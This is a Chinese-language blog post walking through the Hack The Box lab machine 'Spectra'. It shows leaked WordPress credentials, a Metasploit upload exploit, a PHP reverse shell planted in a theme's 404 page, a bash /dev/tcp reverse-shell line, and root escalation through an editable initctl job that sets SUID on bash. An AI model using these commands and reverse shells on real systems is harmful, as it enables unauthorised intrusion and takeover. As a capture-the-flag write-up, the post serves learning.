<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Spectra - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Spectra靶场信息   靶场类型   信息搜集 使用nmap进行基本的端口扫描 nmap –A -sS -sC -sV 10.10.10.229   我们发现开启了22、80和3306端口 咱们访问80端口看一下   内容非常简单，咱们看一下源代码   发现会跳转到域名spectra.htb 咱们在hosts里添加该域名 vim &#x2F;etc&#x2F;host">
<meta property="og:type" content="article">
<meta property="og:title" content="Spectra - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Spectra靶场信息   靶场类型   信息搜集 使用nmap进行基本的端口扫描 nmap –A -sS -sC -sV 10.10.10.229   我们发现开启了22、80和3306端口 咱们访问80端口看一下   内容非常简单，咱们看一下源代码   发现会跳转到域名spectra.htb 咱们在hosts里添加该域名 vim &#x2F;etc&#x2F;host">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/40981969-2f32-4be6-8b07-40b92a4f8fe4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/e12c6638-da63-4441-8d4d-b1cf416dcc33.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/4756298a-80cc-4ef3-8796-eb5e8011f671.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/c7f9bfc1-a2aa-4540-9f7a-e7044581761b.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/bb614980-11ea-49fa-a25b-2a6d432a7b87.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/9c1f59e2-8bb8-43bd-86fd-8f7cc90e08f5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/824a6c95-d993-4fd1-9763-5ee2f684ad8a.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/c5e556ac-5a56-4755-b682-933d401ec916.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/9c0bedcb-a66d-4f86-80d7-634638611d86.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/7328b157-ccaa-48c3-b437-241fd55559e2.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/78e79639-fd14-425c-b7c0-2eed375e6101.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/33b630df-0b2f-40eb-804e-d439b5ed5759.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/7f60926b-0f97-494b-a744-60adde3f9b30.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/686ef251-eba4-4521-aa7d-7165b488e7a6.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/bf1da408-1c5a-44aa-9068-ce59568085b7.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/fadb6925-8c3c-4b4a-808e-14a6d99017a9.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/868533cb-0788-4021-9b62-77f6eb081c8a.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/08318735-1667-416e-a8ba-026a8a53d30b.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/a46c68a1-4aad-4f22-8e17-e2cbb80103ad.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/f0fedb03-849e-4e78-8dd5-1d58ee44a324.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/6fdc0e3e-5b36-48bb-81b5-38ebd78f36f9.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/e5eef879-2e13-4c24-b8aa-cd62e9758d21.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/2dbab099-3772-4acb-b524-8744271bca13.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/a5657c34-b7b4-4f8c-a5d7-c2e7e2241f5c.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/b6633049-275d-4919-8110-0ababc2d1387.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/d0abe880-965e-4e04-8897-f4e3f60cdc28.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/031c4c92-5481-4b75-878a-49d2bc8c8a52.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/68955dcb-37aa-4078-a482-58bab345286c.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/cde245bf-6acc-4175-a3ee-4d49616b1f14.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/7ca73e26-e17c-4b04-addc-d0db95a41efb.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/311a7387-27e8-4097-a0db-d589564d98a8.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/4e2c24d0-1b7a-40b5-a8c1-c7c385f44f05.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/bd7b8a2c-88f5-4a08-bc95-2c849f0921f9.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/f2657385-cc50-4cd3-98f2-6fe2895c5b04.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/c5ec8080-9167-4e6f-9414-aafab9bcbf65.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/f55fb7d0-8370-45a5-a0c6-4f6e4146a1fd.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/bd45f2a9-0b96-4350-88df-892961fa151b.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/31500707-851f-4c1f-8d56-8f9bd9994c2d.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/5ebce451-c36c-4c06-b548-9060b1f8161f.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/442af819-76f1-4641-96de-a5f88281c22e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/10cbc613-7c64-4b88-aa5f-1554c5d35d9e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/0312313f-804d-4e16-a25d-14dcfdde16ad.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/5614724f-e90f-4335-bbda-f4f461446ca4.png">
<meta property="article:published_time" content="2021-05-28T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:52:43.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/40981969-2f32-4be6-8b07-40b92a4f8fe4.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                请我喝咖啡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Spectra - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Spectra - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-05-28T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-05-28
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Spectra"><span class="post-toc-text">Hackthebox - Spectra</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-Spectra"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Spectra - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-05-28 19:38:36" datetime="2021-05-28T11:38:36.000Z"  itemprop="datePublished">2021-05-28</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Spectra"><a href="#Hackthebox-Spectra" class="headerlink" title="Hackthebox - Spectra"></a>Hackthebox - Spectra</h1><p><strong>靶场信息</strong></p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/40981969-2f32-4be6-8b07-40b92a4f8fe4.png" class>

<p><strong>靶场类型</strong></p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/e12c6638-da63-4441-8d4d-b1cf416dcc33.png" class>

<p><strong>信息搜集</strong></p>
<p>使用nmap进行基本的端口扫描</p>
<p>nmap –A -sS -sC -sV 10.10.10.229</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/4756298a-80cc-4ef3-8796-eb5e8011f671.png" class>

<p>我们发现开启了22、80和3306端口</p>
<p>咱们访问80端口看一下</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/c7f9bfc1-a2aa-4540-9f7a-e7044581761b.png" class>

<p>内容非常简单，咱们看一下源代码</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/bb614980-11ea-49fa-a25b-2a6d432a7b87.png" class>

<p>发现会跳转到域名spectra.htb 咱们在hosts里添加该域名</p>
<p>vim &#x2F;etc&#x2F;hosts</p>
<p>10.10.10.229 spectra.htb <a href="http://www.spectra.htb/" target="_blank" rel="noopener">www.spectra.htb</a></p>
<p>然后咱们访问一下试试</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/9c1f59e2-8bb8-43bd-86fd-8f7cc90e08f5.png" class>

<p>咱们可以看到这是一个wordpress的站点</p>
<p>到处点了一下似乎没有可用的东西，咱们看看另一个连接</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/824a6c95-d993-4fd1-9763-5ee2f684ad8a.png" class>

<p>建立数据连接错误，既然提示这个，又开启了3306端口，那么后面估计是一定会用到的，咱们先记录一下，后面很有可能会用到，然后把眼光放回第一个页面</p>
<p>咱们目前思路卡壳了，不知道做什么了，那就扫描一下目录吧，我这里使用dirbuster工具进行目录爆破吧</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/c5e556ac-5a56-4755-b682-933d401ec916.png" class>

<p>导入后按start启动扫描</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/9c0bedcb-a66d-4f86-80d7-634638611d86.png" class>

<p>扫描的同时我也在挨个看，发现&#x2F;testing&#x2F;目录下存在目录遍历漏洞，咱们进入看看</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/7328b157-ccaa-48c3-b437-241fd55559e2.png" class>

<p>进来后发现又一些php文件，看文件名似乎还有配置文件，咱们挨个查看一下</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/78e79639-fd14-425c-b7c0-2eed375e6101.png" class>

<p>在一圈文件查看下来后都没有看到什么有用的信息，但在文件wp-config.php.save的时候，点进去却是空白页面，但文件大小处却又明确显示是有内容的，这一点引起了我的注意</p>
<p>咱们看一下网页源代码</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/33b630df-0b2f-40eb-804e-d439b5ed5759.png" class>

<p>咱们居然在这找到了数据库的账号密码，看来运气还是不错的</p>
<p>db_name &#x3D; dev</p>
<p>db_user &#x3D; devtest</p>
<p>db_password &#x3D; devteam01</p>
<p><strong>漏洞利用</strong></p>
<p>这里既然拿到了数据库账号密码，又开启了3306端口，咱们自然是尝试进行登录了</p>
<p>mysql –host 10.10.10.229 –user devtest –password devteam01 -D dev</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/7f60926b-0f97-494b-a744-60adde3f9b30.png" class>

<p>但是这里却显示登录失败？不允许连接到这个数据库</p>
<p>嗯。。。看来果然没我想的那么简单啊，那么现在唯一用得到账号密码的，就只有wordpress了，咱们只能从这里继续入手了</p>
<p><a href="http://spectra.htb/main/wp-login.php" target="_blank" rel="noopener">http://spectra.htb/main/wp-login.php</a></p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/686ef251-eba4-4521-aa7d-7165b488e7a6.png" class>

<p>咱们进行登录</p>
<p>直接使用之前获取到的数据库账号devtest进行登录却提示没有这个账号</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/bf1da408-1c5a-44aa-9068-ce59568085b7.png" class>

<p>看来果然没有我想的那么简单，我大意了，没有闪</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/fadb6925-8c3c-4b4a-808e-14a6d99017a9.png" class>

<p>好在这个时候，突然灵感从天而降，发现主页有一篇文章，最经典的一句“hello world”，but 咱们的重点不在这里，而是在发帖人，administrator</p>
<p>好家伙，这不就有用户名了嘛？而且同时咱们nmap没有识别出操作系统，看到这个就可以怀疑是windows了</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/868533cb-0788-4021-9b62-77f6eb081c8a.png" class>

<p>咱们使用账户administrator 密码devteam01进行登录，成功进入后台</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/08318735-1667-416e-a8ba-026a8a53d30b.png" class>

<p>并且获取到wordpress的版本为5.4.2</p>
<p>拿到版本了，就可以使用已知漏洞进行攻击了</p>
<p>咱们这里有三种办法获得shell</p>
<p>第一种：</p>
<p>使用msf进行负载攻击</p>
<p>use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_admin_shell_upload</p>
<p>set USERNAME administrator</p>
<p>set PASSWORD devteam01</p>
<p>set TARGETURI &#x2F;main</p>
<p>set rhosts 10.10.10.229</p>
<p>set lhost 10.10.14.135</p>
<p>exploit</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/a46c68a1-4aad-4f22-8e17-e2cbb80103ad.png" class>

<p>nice 成功获取到一个shell</p>
<p>第二种：</p>
<p>修改404页面进行反弹shell</p>
<p>首先本地使用nc监听一个端口</p>
<p>nc -nvlp 5555</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/f0fedb03-849e-4e78-8dd5-1d58ee44a324.png" class>

<p>然后咱们登入到网站后台</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/6fdc0e3e-5b36-48bb-81b5-38ebd78f36f9.png" class>

<p>修改404页面的源码</p>
<p>咱们插入恶意代码</p>
<p>下载地址</p>
<p><a href="http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz" target="_blank" rel="noopener">http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz</a></p>
<p>其中需要修改的内容</p>
<p>set_time_limit (0);</p>
<p>$VERSION &#x3D; “1.0”;</p>
<p>$ip &#x3D; ‘10.10.14.135’; &#x2F;&#x2F; CHANGE THIS</p>
<p>$port &#x3D; 5555; &#x2F;&#x2F; CHANGE THIS</p>
<p>$chunk_size &#x3D; 1400;</p>
<p>$write_a &#x3D; null;</p>
<p>$error_a &#x3D; null;</p>
<p>$shell &#x3D; ‘uname -a; w; id; &#x2F;bin&#x2F;sh -i’;</p>
<p>$daemon &#x3D; 0;</p>
<p>$debug &#x3D; 0;</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/e5eef879-2e13-4c24-b8aa-cd62e9758d21.png" class>

<p>然后点击保存</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/2dbab099-3772-4acb-b524-8744271bca13.png" class>

<p>啊这，好像失败了，诸位等我稍稍研究一下</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/a5657c34-b7b4-4f8c-a5d7-c2e7e2241f5c.png" class>

<p>好了，经过测试，咱们将模板设置为Twenty Sevente就可以保存了</p>
<p>然后咱们访问404页面</p>
<p><a href="http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php" target="_blank" rel="noopener">http://spectra.htb/main/wp-content/themes/twentyseventeen/404.php</a></p>
<p>成功反弹回shell</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/b6633049-275d-4919-8110-0ababc2d1387.png" class>

<p>第三种：</p>
<p>第三种就是利用插件上传的漏洞，然后使用msf来进行shell的接收，这个步骤咱们不如直接第一步了，有点多此一举，有兴趣的朋友可以自己进行研究</p>
<p>exploit地址</p>
<p><a href="https://www.exploit-db.com/exploits/36374" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/36374</a></p>
<p>msf设置</p>
<p>use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_slideshowgallery_upload</p>
<p>set rhosts 192.168.1.101</p>
<p>set targeturi &#x2F;wordpress</p>
<p>exploit</p>
<p>exec（“ &#x2F; bin &#x2F; bash -c’bash -i&gt;＆&#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;＆1’”）</p>
<p>参考连接</p>
<p><a href="https://www.hackingarticles.in/wordpress-reverse-shell/" target="_blank" rel="noopener">https://www.hackingarticles.in/wordpress-reverse-shell/</a></p>
<p><strong>权限提升</strong></p>
<p>咱们首先使用python3获取一个更加稳定的shell</p>
<p>python3 -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/d0abe880-965e-4e04-8897-f4e3f60cdc28.png" class>

<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/031c4c92-5481-4b75-878a-49d2bc8c8a52.png" class>

<p>我们在翻找文件的时候，在opt目录下发现了一个autologin.conf.orig文件</p>
<p>cat查看后，发现是有个自动登录的脚本，指向了&#x2F;etc&#x2F;autologin</p>
<p>咱们过去看看</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/68955dcb-37aa-4078-a482-58bab345286c.png" class>

<p>发现了一个passwd文件，咱们cat查看</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/cde245bf-6acc-4175-a3ee-4d49616b1f14.png" class>

<p>得到了一个密码</p>
<p>SummerHereWeCome!!</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/7ca73e26-e17c-4b04-addc-d0db95a41efb.png" class>

<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/311a7387-27e8-4097-a0db-d589564d98a8.png" class>

<p>经过测试并结合咱们找flag以及翻目录的时候得到的消息来看，似乎是用户katie的</p>
<p>正好开启了22端口，咱们使用ssh进行登录</p>
<p>ssh <a href="mailto:&#x6b;&#x61;&#x74;&#x69;&#101;&#64;&#49;&#x30;&#46;&#x31;&#x30;&#46;&#49;&#48;&#46;&#50;&#50;&#57;">&#x6b;&#x61;&#x74;&#x69;&#101;&#64;&#49;&#x30;&#46;&#x31;&#x30;&#46;&#49;&#48;&#46;&#50;&#50;&#57;</a></p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/4e2c24d0-1b7a-40b5-a8c1-c7c385f44f05.png" class>

<p>成功登录</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/bd7b8a2c-88f5-4a08-bc95-2c849f0921f9.png" class>

<p>成功获得user权限的flag</p>
<p>使用sudo -l查看一下咱们的sudo权限</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/f2657385-cc50-4cd3-98f2-6fe2895c5b04.png" class>

<p>发现咱们可以执行&#x2F;sbin&#x2F;initctl</p>
<p>这个权限是查看咱们可编辑的服务</p>
<p>sudo initctl list</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/c5ec8080-9167-4e6f-9414-aafab9bcbf65.png" class>

<p>可编辑的服务挺多的，我就不全部截图了，然后咱们进行筛选查看</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/f55fb7d0-8370-45a5-a0c6-4f6e4146a1fd.png" class>

<p>咱们在最后面看到一个名为test2的未运行且可编辑的服务，叫这个名字那就肯定不一般了，咱们look look，所有的服务都在&#x2F;etc&#x2F;init目录下</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/bd45f2a9-0b96-4350-88df-892961fa151b.png" class>

<p>这么多test的服务，咱们就从test.conf开始look吧</p>
<p>cat &#x2F;etc&#x2F;init&#x2F;test.conf</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/31500707-851f-4c1f-8d56-8f9bd9994c2d.png" class>

<p>嗯。。。在这里正在运行一个nodejs的文件 nodetest.js 咱们也去look look</p>
<p>cat &#x2F;srv&#x2F;nodetest.js</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/5ebce451-c36c-4c06-b548-9060b1f8161f.png" class>

<p>咱们将恶意代码替换到test.conf里，然后执行进行提权吧，其实也可以更改nodetest.js的文件进行nc反弹并提权，但是好麻烦啊，我就给各位一个图，大家有兴趣的自己研究吧，我使用第二种办法，直接修改test.conf的内容吧</p>
<p>第一种：</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/442af819-76f1-4641-96de-a5f88281c22e.png" class>

<p>第二种：</p>
<p>nano &#x2F;etc&#x2F;init&#x2F;test.conf</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/10cbc613-7c64-4b88-aa5f-1554c5d35d9e.png" class>

<p>执行如下命令即可提权</p>
<p>sudo &#x2F;sbin&#x2F;initctl start test</p>
<p>使用sudo权限启动test服务</p>
<p>ls -l &#x2F;bin&#x2F;bash</p>
<p>查看&#x2F;bin&#x2F;bash即可发现我们的SUID已经传递给root用户</p>
<p>&#x2F;bin&#x2F;bash -p</p>
<p>提权</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/0312313f-804d-4e16-a25d-14dcfdde16ad.png" class>

<p>提权成功</p>
<img src="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/5614724f-e90f-4335-bbda-f4f461446ca4.png" class>

<p>成功获得root权限的flag 完事儿收工睡觉</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/&title=《Spectra - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/&title=《Spectra - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Spectra - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Tenet - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/05/26/Hackthebox/Easy/Hackthebox-Love/" id="post-next" class="post-nav-link">
